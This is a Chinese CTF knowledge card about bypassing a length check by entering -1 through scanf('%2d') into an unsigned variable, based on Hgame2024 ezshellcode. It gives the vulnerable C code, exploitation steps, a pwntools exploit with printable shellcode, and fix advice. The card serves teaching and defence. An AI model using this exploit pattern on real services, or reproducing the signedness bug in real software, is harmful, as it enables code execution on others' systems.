---
id: binary-pwn-sandbox-escape-scanf-signed-negative-length-bypass
title: scanf("%2d") 读入负数到 unsigned 长度变量：-1 绕过 ≤10 长度检查并让 read 获得 0xFFFFFFFF 长度
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: scanf-signed-negative-unsigned-length-bypass
aliases:
- scanf %2d 负数绕过
- 长度检查负数绕过
- signed unsigned 长度混用
- -1 变 4294967295
- Hgame2024 ezshellcode
- 长度上限绕过
tags:
- pwn
- ctf
- shellcode
- integer
- signedness
- scanf
- length-check
- bypass
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V529
  verified_at: '2026-11-11T15:35:50+08:00'
  notes: 已对照原文 Hgame2024 ezshellcode 反编译与 exp 核对：scanf(%2d,&unsigned v4)+(int)v4<=10+myread(v5,v4) 形参 unsigned->read 长度链路一致，输入 -1 得 0xFFFFFFFF；过滤按 read 实际返回值逐字节检查可见字符；PoC 与原文 exp 一致（-1 + 64 位 ASCII 串）。6 张截图核对：01/02 execve 版本成功、03/04 demo1 read 现场、05/06 0xb reread 现场，无读取失败。
---

## 一句话结论

程序用 `scanf("%2d", &len)` 把长度读进 `unsigned int`，再以 `(int)len <= 10` 做上限检查、随后把 `len` 原样传给 `read` 时，输入 `-1` 会让 `(int)len == -1` 通过检查，而 `read` 实际收到无符号的 `0xFFFFFFFF` 长度，一次性读入任意长的 shellcode，长度限制被完全绕过。

## 原理

- **同一块内存两种解释**：`scanf("%d")` 按有符号十进制解析并写入 4 字节；变量声明为 `unsigned int` 只是编译期的类型解释。输入 `-1` 写入的位模式是 `0xFFFFFFFF`。
- **检查用有符号、使用用无符号**：`if ((int)v4 <= 10)` 把位模式按 `int` 解释为 -1，条件成立；而 `myread(v5, v4)` 的形参是 `unsigned int a2`，`read(0, buf, a2)` 的第三参是 `size_t`，-1 被零扩展为 `0xFFFFFFFF`（32 位）或更长的无符号大数，`read` 会一直读到大缓冲区被填满或对端关闭。
- **后续过滤不影响读入长度**：本例 `myread` 里 `v5 = read(0, a1, a2)` 取实际读入字节数，随后按 `v5` 逐字节做可见字符检查；攻击者只要发送的都是白名单字符（例如现成的纯 ASCII shellcode），检查通过，且 `read` 已经把整段 shellcode 写入可执行页。
- **为什么是常见疏忽**：C 语言 `%d`/`unsigned`/`int`/`size_t` 混用、比较表达式强制转换是不同的类型解释；开发者关注"长度 ≤ 10"的语义，却忽略了负数输入在无符号上下文里变成极大值的行为。
- **前提**：`scanf` 不会拒绝负数；`read` 缓冲区足够大（本例 mmap 0x1000 的 RWX 页）；实际发送字节数受对端读取限制，但远超 10 字节即达到目的。

## 触发条件

- 程序读取用户输入的长度用于后续 `read`/`memcpy`/`fread` 等，长度变量的声明类型与检查时使用的有符号语义不一致。
- 检查表达式为 `(int)len <= N`、`len <= -1` 或与有符号常量比较，而实际长度参数是无符号类型（`size_t`、`unsigned int`）。
- 输入函数允许负数（`scanf("%d"/"%2d")`、`atoi`、`strtol` 等未做范围校验）。
- 目标缓冲区（RWX 页或可执行 BSS）足够大，能容纳完整 shellcode；后续过滤只按实际读入字节校验白名单。

## 利用步骤

1. 逆向上限检查与长度使用：确认 `scanf` 格式、长度变量类型、比较表达式与最终 `read` 的形参类型。
2. 本地试 `-1`：观察检查是否通过、`read` 是否读入远超上限的字节（可用调试器看 `read` 的第三个参数）。
3. 准备符合后续过滤的 payload：若过滤为可见字符白名单，用纯 ASCII shellcode（见关联卡）；若仅长度限制，用普通 execve/ORW shellcode。
4. 发送 `-1`（格式限制为 `%2d` 时输入两个字符 `-1`），随后发送 payload；`read` 会继续等待/读入，直到收到足够字节或连接关闭。
5. 程序跳转执行缓冲区，getshell 或 ORW 读 flag。

## PoC

```c
// 典型错误代码（原文 Hgame2024 ezshellcode 简化）
unsigned int v4;
void (*v5)(void) = mmap((void*)0x20240000, 0x1000, 7, 33, -1, 0);
scanf("%2d", &v4);          // 输入 "-1" -> v4 = 0xFFFFFFFF
if ((int)v4 <= 10) {        // (int)0xFFFFFFFF == -1 <= 10 通过
    myread(v5, v4);         // read(0, 0x20240000, 0xFFFFFFFF)
}
v5();
```

```python
from pwn import *
context(arch='amd64', os='linux')
io = process('./vul')
shell = 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'
io.sendlineafter('input the length of your shellcode:', '-1')   # 负数绕过 <=10
io.sendafter('your shellcode:', shell)                          # 纯可见字符 shellcode
io.interactive()
```

## 变体与关联

- 变体一：`%u`/`%d` 与 `atoi`/`strtol` 组合、长度存 `int64` 但比较用 `int`、或检查用 `len < 0` 后使用，均可出现同类符号/截断问题。
- 变体二：`%2d` 的宽度限制只影响读入字符数（`-1` 恰好 2 字符），大负数如 `-2147483648` 需更长输入宽度。
- 关联：[[binary-pwn-signed-int-add-overflow-negative-check-bypass]]（整数符号/溢出类校验绕过）、[[binary-pwn-sandbox-escape-visible-shellcode-manual-construction-tricks]]（负数长度放开后配合可见字符 shellcode）、[[ctf-pwn-visible-char-ae64-rdx-base-openat-sendfile-orw]]（纯可见字符编码的 ORW 变体）。
- 边界：若检查与使用都按无符号比较（`len <= 10u`），-1 变成极大值会被拒绝；若 `read` 长度被截断为 `short`/`char`，-1 可能变成 255 或 -1 的其他解释，需按实际类型分析。

## 检测与防御

- 检测（审计）：搜索 `scanf("%d"`/`"%2d"` 读长度、`(int)` 强转比较、`unsigned` 长度传给 `read`/`memcpy` 的代码；CTF 流量中出现长度参数为负数但后续读入大量数据。
- 修复：长度变量统一用 `size_t`/`unsigned`，检查前先拒绝负数与非数字输入（`strtoul` + 范围校验）；比较时保持类型一致（`if (len > MAX) reject`）；用 `read` 的实际返回值控制后续处理，不信任用户给定长度。
- 加固：目标缓冲区按最大上限分配并检查 `read` 返回值；执行页设为不可写（W^X），shellcode 写入与执行分离。
